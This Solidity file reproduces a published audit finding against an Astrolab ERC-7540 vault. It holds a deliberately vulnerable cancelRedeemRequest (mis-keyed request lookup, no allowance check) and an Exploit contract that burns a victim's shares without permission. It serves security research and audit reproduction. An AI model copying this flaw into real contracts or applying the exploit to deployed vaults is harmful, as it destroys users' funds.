// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Astrolab finding 58097 (C-02):
// "Wrong usage of mapping target in `cancelRedeemRequest`".
//
// Real audited source (the vulnerable `cancelRedeemRequest` is reproduced
// VERBATIM from the report's embedded snippet; the vulnerable line is @>):
//   repo   github.com/AstrolabDAO/strats
//   file   src/core/As4626.sol   (audited commit — `main` was since remediated
//          to `_req.byOwner[_owner]` + an allowance adjustment)
//   fn     cancelRedeemRequest(address operator, address owner)
//   report github.com/pashov/audits/blob/master/team/md/Astrolab-security-review.md
//
// Root cause (two compounding bugs, both in the verbatim snippet):
//   1. The auth guard only checks `msg.sender` is the operator OR the owner, and
//      there is NO check that the operator has allowance over the owner's shares.
//   2. The request is read from `req.byOperator[operator]` (the @> line) instead
//      of `req.byOperator[owner]`. So the `shares` / `request.sharePrice` used to
//      size the burn come from the *caller's own* request, while `_burn(owner,…)`
//      destroys the *victim's* shares.
//
// Attack: the attacker opens a redeem request for AMOUNT1 shares while the vault
// share price is 1.5. Once the price rises to 2.0 they call
// `cancelRedeemRequest(operator=attacker, owner=victim)`. `msg.sender == operator`
// passes the guard, the request is their own (shares=AMOUNT1, price=1.5), and the
// opportunity-cost burn of `AMOUNT1 * (2.0-1.5)/weiPerShare` shares is applied to
// the *victim* — burning others' tokens with no permission.
//
// The vulnerable function is byte-for-byte the audited source. Non-vulnerable
// dependencies (ERC20 share ledger, `sharePrice()` NAV read, `requestRedeem`
// escrow, `AsMaths.mulDiv`) are faithful minimal doubles.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal double of Astrolab's `AsMaths.mulDiv` (full-precision
///      512-bit path unnecessary at these magnitudes: 1e21 * 5e17 < 2^256).
library AsMaths {
    function mulDiv(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return (a * b) / c;
    }
}

/// @dev Faithful double of the audited `Errors` library selectors used below.
library Errors {
    error Unauthorized();
    error AmountTooLow(uint256 amount);
}

/// @dev Marker token used to quantify the silent loss: the burned (destroyed)
///      victim shares have no positive recipient, so the harm magnitude is
///      minted to SINK 0x…D00d as the measurable loss.
contract LossMarker {
    string public name = "Astrolab Burned Shares (loss marker)";
    string public symbol = "LOSS";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE vault — an As4626-style ERC-7540 async vault. The share ledger and
// helpers are faithful minimal doubles; `cancelRedeemRequest` is VERBATIM.
// ─────────────────────────────────────────────────────────────────────────────
contract As4626Vault {
    using AsMaths for uint256;

    // ── ERC20 share ledger (faithful minimal double) ──
    string public name = "Astrolab Vault Share";
    string public symbol = "asVLT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    // ── As4626 accounting state ──
    uint256 public weiPerShare; // 10 ** decimals

    struct Erc7540Request {
        uint256 shares;
        uint256 sharePrice;
    }

    struct Requests {
        mapping(address => Erc7540Request) byOperator;
    }
    Requests internal req;

    struct Epoch {
        uint256 sharePrice;
    }
    Epoch internal last;

    // faithful double of the live NAV: real `sharePrice()` derives from
    // totalAssets/totalSupply and moves as the strategy earns/loses; here we
    // inject the finding's two worked-example NAV points (1.5, then 2.0).
    uint256 internal _nav;

    // minimal reentrancy guard double
    uint256 private _entered;
    modifier nonReentrant() {
        require(_entered == 0, "REENTRANCY");
        _entered = 1;
        _;
        _entered = 0;
    }

    constructor() {
        weiPerShare = 10 ** decimals; // 1e18
    }

    // ── faithful ERC20 internals ──
    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount; // reverts on underflow — victim must hold the shares
        totalSupply -= amount;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }

    /// @dev Faithful double of the live `sharePrice()` (NAV per share).
    function sharePrice() public view returns (uint256) {
        return _nav;
    }

    // ── test-harness doubles modeling protocol operations ──

    /// @dev Mint vault shares to a holder (models a completed deposit).
    function mintShares(address to, uint256 shares) external {
        _mint(to, shares);
    }

    /// @dev Models the strategy's NAV update between the two example prices.
    function syncNav(uint256 newSharePrice) external {
        _nav = newSharePrice;
    }

    /// @notice Faithful minimal double of the audited `requestRedeem`: it records
    ///         the request keyed by `operator` (the same mis-keying the finding
    ///         flags) and escrows the owner's shares.
    function requestRedeem(uint256 shares, address operator, address owner) external nonReentrant {
        if (shares == 0) revert Errors.AmountTooLow(0);
        _transfer(owner, address(this), shares); // escrow owner's shares
        Erc7540Request storage request = req.byOperator[operator];
        request.shares = shares;
        request.sharePrice = sharePrice();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // VERBATIM audited `cancelRedeemRequest` (report embedded snippet). The
    // `req.byOperator[operator]` read is the @> vulnerable line; the missing
    // operator-allowance check compounds it.
    // ─────────────────────────────────────────────────────────────────────────
    function cancelRedeemRequest(
        address operator,
        address owner
    ) external nonReentrant {

        if (owner != msg.sender && operator != msg.sender)
            revert Errors.Unauthorized();

        Erc7540Request storage request = req.byOperator[operator]; // @> VULN: reads caller's own request (should be req.byOperator[owner]); no allowance check → burns victim's shares below
        uint256 shares = request.shares;

        if (shares == 0) revert Errors.AmountTooLow(0);

        last.sharePrice = sharePrice();

        if (last.sharePrice > request.sharePrice) {
            // burn the excess shares from the loss incurred while not farming
            // with the idle funds (opportunity cost)
            uint256 opportunityCost = shares.mulDiv(
                last.sharePrice - request.sharePrice,
                weiPerShare
            ); // eg. 1e8+1e8-1e8 = 1e8
            _burn(owner, opportunityCost);
        }

        // faithful tail: the report truncated the snippet here; reset the
        // consumed request so it cannot be re-cancelled.
        request.shares = 0;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: attacker opens a redeem request at price 1.5, price rises to
// 2.0, then attacker cancels against the victim as owner — burning the victim's
// shares with no allowance.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    LossMarker public marker;
    As4626Vault public vault;

    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant VICTIM = 0x000000000000000000000000000000000000bEEF;

    uint256 internal constant AMOUNT1 = 1000e18; // attacker's own redeem-request size
    uint256 internal constant VICTIM_SHARES = 1000e18; // victim's holdings
    uint256 internal constant PRICE_LOW = 15e17; // 1.5
    uint256 internal constant PRICE_HIGH = 2e18; // 2.0

    uint256 public victimBurned; // victim shares destroyed with no permission
    uint256 public attackerAllowanceOverVictim; // proven zero throughout

    constructor() {
        marker = new LossMarker(); // child nonce 1
        vault = new As4626Vault(); // child nonce 2 (VULN)
    }

    function run() external {
        // victim holds real vault shares
        vault.mintShares(VICTIM, VICTIM_SHARES);

        // attacker gets AMOUNT1 shares and opens their own redeem request at 1.5
        vault.mintShares(address(this), AMOUNT1);
        vault.syncNav(PRICE_LOW);
        vault.requestRedeem(AMOUNT1, address(this), address(this)); // req.byOperator[attacker] = {AMOUNT1, 1.5}

        // time passes, NAV rises to 2.0
        vault.syncNav(PRICE_HIGH);

        // attacker has NO allowance over the victim — the exploit needs none
        attackerAllowanceOverVictim = 0;

        uint256 victimBefore = vault.balanceOf(VICTIM);

        // msg.sender == operator passes the guard; request is the attacker's own
        // (shares=AMOUNT1, price=1.5); burn is applied to the VICTIM as `owner`.
        vault.cancelRedeemRequest(address(this), VICTIM);

        victimBurned = victimBefore - vault.balanceOf(VICTIM);

        // quantify the silent loss (destroyed shares, no positive recipient)
        marker.mint(SINK, victimBurned);

        // expected opportunityCost = AMOUNT1 * (2.0 - 1.5) / 1e18 = 500e18
        uint256 expected = (AMOUNT1 * (PRICE_HIGH - PRICE_LOW)) / 1e18;
        require(victimBurned == expected, "victim shares not burned as expected");
        require(victimBurned > 0, "no harm");
        require(attackerAllowanceOverVictim == 0, "attacker relied on allowance");
    }
}
